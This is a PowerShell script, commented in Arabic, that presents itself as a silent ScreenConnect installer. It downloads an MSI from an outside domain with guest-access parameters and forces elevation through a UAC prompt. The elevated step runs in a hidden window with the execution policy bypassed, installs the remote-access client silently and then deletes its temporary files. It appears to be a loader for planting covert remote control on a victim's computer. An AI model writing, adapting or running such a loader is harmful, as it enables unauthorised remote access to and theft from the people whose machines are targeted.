# ============================================================
#  ScreenConnect Silent Installer
#  - Self-elevation via UAC
#  - Fully hidden PowerShell windows
#  - Robust error handling
# ============================================================

# --- إعدادات عامة ---
$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"
$LockFile     = Join-Path $env:TEMP "SC_Install.lock"

# ============================================================
#  1) التحقق من الصلاحيات
# ============================================================
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdmin     = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ============================================================
#  2) لو مش Admin → نرفع الصلاحيات
# ============================================================
if (-not $isAdmin) {

    # منع تشغيل نسختين في نفس الوقت
    if (Test-Path $LockFile) {
        Write-Host "Another installation is already in progress. Exiting."
        exit 1
    }
    New-Item -Path $LockFile -ItemType File -Force | Out-Null

    try {
        # --- كود السكربت اللي هيشتغل بصلاحيات Admin ---
        # (نفس الكود بالظبط، لكن من غير جزء الرفع)
        $elevatedScript = @'
$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"
$LockFile     = Join-Path $env:TEMP "SC_Install.lock"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$timestamp] $Message"
}

function Try-Download {
    param($Dir)
    if (-not (Test-Path $Dir)) {
        Write-Log "Directory '$Dir' does not exist."
        return $null
    }
    $target = Join-Path $Dir $FileName
    try {
        Write-Log "Trying to download to: $target"
        Invoke-WebRequest -Uri $Url -OutFile $target -UseBasicParsing -ErrorAction Stop
        if (-not (Test-Path $target)) { throw "File not found after download." }
        $size = (Get-Item $target).Length
        Write-Log "Downloaded size: $size bytes"
        if ($size -lt 100KB) { throw "File too small, likely invalid." }
        return $target
    }
    catch {
        Write-Log "Failed to download to '$Dir': $($_.Exception.Message)"
        if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

try {
    # --- التحميل ---
    $MsiPath = Try-Download -Dir $PrimaryDir
    if (-not $MsiPath) {
        Write-Log "Falling back to TEMP folder..."
        $MsiPath = Try-Download -Dir $FallbackDir
    }
    if (-not $MsiPath -or -not (Test-Path $MsiPath)) {
        throw "Could not download MSI to either C:\ or TEMP."
    }
    Write-Log "MSI downloaded at: $MsiPath"

    # --- التحقق من التوقيع ---
    $bytes = [System.IO.File]::ReadAllBytes($MsiPath)[0..3]
    $signature = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
    if ($signature -ne "D0CF11E0") {
        throw "File is not a valid MSI. Signature: $signature"
    }
    Write-Log "File signature OK (valid MSI)."

    # --- مسار اللوج ---
    $LogPath = Join-Path (Split-Path $MsiPath -Parent) $LogName
    Write-Log "Install log will be at: $LogPath"

    # --- التثبيت ---
    Write-Log "Installing silently..."
    $arguments = "/i `"$MsiPath`" /qn /norestart /L*v `"$LogPath`""
    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $arguments -Wait -PassThru -NoNewWindow
    Write-Log "msiexec ExitCode: $($proc.ExitCode)"

    if ($proc.ExitCode -eq 0 -or $proc.ExitCode -eq 3010) {
        Write-Log "SUCCESS: ScreenConnect installed."
        exit 0
    } else {
        Write-Log "FAILED. ExitCode=$($proc.ExitCode). Check log: $LogPath"
        exit $proc.ExitCode
    }
}
catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    exit 1
}
finally {
    # تنظيف الـ lock
    if (Test-Path $LockFile) { Remove-Item $LockFile -Force -ErrorAction SilentlyContinue }
}
'@

        # --- حفظ السكربت في ملف مؤقت ---
        $tempScript = Join-Path $env:TEMP "SC_Elevated_$(Get-Random).ps1"
        Set-Content -Path $tempScript -Value $elevatedScript -Encoding UTF8

        Write-Host "Requesting administrator privileges..."

        # --- تشغيل PowerShell مخفي تمامًا مع UAC ---
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`""
        $psi.Verb            = "RunAs"        # ← UAC
        $psi.UseShellExecute = $true
        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow  = $true

        Write-Host "Triggering UAC prompt..."
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit()

        Write-Host "Elevated process exited with code: $($proc.ExitCode)"

        # --- تنظيف ---
        Start-Sleep -Seconds 2
        if (Test-Path $tempScript) { Remove-Item $tempScript -Force -ErrorAction SilentlyContinue }
        if (Test-Path $LockFile)   { Remove-Item $LockFile   -Force -ErrorAction SilentlyContinue }

        exit $proc.ExitCode
    }
    catch {
        Write-Host "ERROR: UAC refused or failed: $($_.Exception.Message)"
        if (Test-Path $tempScript) { Remove-Item $tempScript -Force -ErrorAction SilentlyContinue }
        if (Test-Path $LockFile)   { Remove-Item $LockFile   -Force -ErrorAction SilentlyContinue }
        exit 1
    }
}

# لو وصلنا هنا يبقى إحنا أصلاً Admin
Write-Host "Already running as Administrator."
